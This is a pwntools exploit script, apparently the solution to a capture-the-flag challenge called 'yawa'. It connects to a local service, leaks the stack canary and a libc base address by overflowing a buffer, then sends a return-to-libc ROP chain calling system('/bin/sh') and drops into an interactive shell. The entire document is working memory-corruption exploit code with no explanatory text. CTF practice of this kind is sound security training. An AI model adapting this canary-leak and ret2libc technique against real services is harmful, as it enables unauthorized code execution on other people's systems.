from pwn import *

# context.log_level = 'debug'
if os.getenv('RUNNING_IN_DOCKER'):
    context.terminal = ['/usr/bin/tmux', 'splitw', '-h', '-p', '75']
else:
    gdb.binary = lambda: 'gef'
    context.terminal = ['alacritty', '-e', 'zsh', '-c']

sla  = lambda r, s: conn.sendlineafter(r, s)
sl   = lambda    s: conn.sendline(s)
sa   = lambda r, s: conn.sendafter(r, s)
se   = lambda s: conn.send(s)
ru   = lambda r, **kwargs: conn.recvuntil(r, **kwargs)
rl   = lambda : conn.recvline()
uu32 = lambda d: u32(d.ljust(4, b'\x00'))
uu64 = lambda d: u64(d.ljust(8, b'\x00'))

exe = ELF("./yawa_patched")
libc = ELF("./libc.so.6")

# conn = process([exe.path])
conn = remote('0.0.0.0', 1337)

sla(b'> ', b'1')
se(b'x' * 89)
sla(b'> ', b'2')
r = rl()
canary = uu64(r[-9:-2]) << 8
print('canary:', hex(canary))

sla(b'> ', b'1')
se(b'y' * 104)
sla(b'> ', b'2')
r = rl()
libc_base = uu64(r[-7:-1]) - 0x29d90
print('libc:', hex(libc_base))

libc.address = libc_base
ret = libc_base + 0x1bc065
pop_rdi = libc_base + 0x1bbea1
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']

sla(b'> ', b'1')
se(b''.join([
    b'y' * 88,
    p64(canary),
    p64(0),
    p64(ret),
    p64(pop_rdi),
    p64(bin_sh),
    p64(system)
]))
sla(b'> ', b'3')

conn.interactive()
